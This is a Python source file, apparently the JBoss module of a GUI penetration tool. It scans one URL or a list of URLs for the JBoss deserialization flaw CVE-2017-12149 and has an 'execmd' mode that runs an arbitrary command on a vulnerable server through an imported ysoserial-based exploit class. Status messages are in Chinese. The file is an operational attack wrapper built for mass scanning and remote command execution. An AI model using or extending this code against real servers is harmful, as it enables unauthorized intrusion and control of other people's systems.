from PyQt5.Qt import QThread,pyqtSignal
import os
from plugins.jbosslib.CVE_2017_12149 import CVE_2017_12149

class Jboss(QThread):
    str_signal = pyqtSignal([str,str])
    active = ""
    url_list = ""
    url = ""
    ysoserial_path = ""
    cmd = ""
    select_bug = ""



    def __init__(self,active,ysoserial_path,url_list="",url="",cmd="",select_bug=""):
        super().__init__()
        self.active = active
        self.ysoserial_path = ysoserial_path
        self.url_list = url_list
        self.url = url
        self.cmd = cmd
        self.select_bug = select_bug

    def check_env(self):
        check_cmd = "java -version"
        if  os.system(check_cmd) != 0:
            self.str_signal[str,str].emit("[-] 未检测到系统安装的java环境，请安装完环境后再试..","red")
            return

    def scan(self,url):
        cve_2017_12149 = CVE_2017_12149(url=url,ysoserial_path=self.ysoserial_path)
        if cve_2017_12149.check():
            self.str_signal[str, str].emit("[+] " + url + " 可能存在 CVE-2017-12149(不回显) 远程代码执行漏洞", "red")
        else:
            self.str_signal[str, str].emit("[-] " + url + " 系统不存在 CVE-2017-12149(不回显) 远程代码执行漏洞", "green")

        self.str_signal[str, str].emit("[+] 扫描执行完毕...", "green")

    def execmd(self):
        if self.select_bug == "CVE-2017-12149":
            cve_2017_12149 = CVE_2017_12149(url=self.url, ysoserial_path=self.ysoserial_path)
            if cve_2017_12149.execmd(bytes(self.cmd,encoding='utf-8')):
                self.str_signal[str, str].emit("[+] 执行完毕", "green")
            else:
                self.str_signal[str, str].emit("[-] 执行出错", "red")




    def run(self):
        if self.active == "scan":
            self.str_signal[str, str].emit("[+] 扫描开始执行", "green")
            if self.url != "":
                self.scan(self.url.strip())
            else:
                try:
                    with open(self.url_list,'r') as f:
                        for line in f.readlines():
                            self.scan(line.strip())
                except:
                    self.str_signal[str, str].emit("[-] 读取 " + self.url_list + ' 出错', "red")
        elif self.active == "execmd":
            self.execmd()



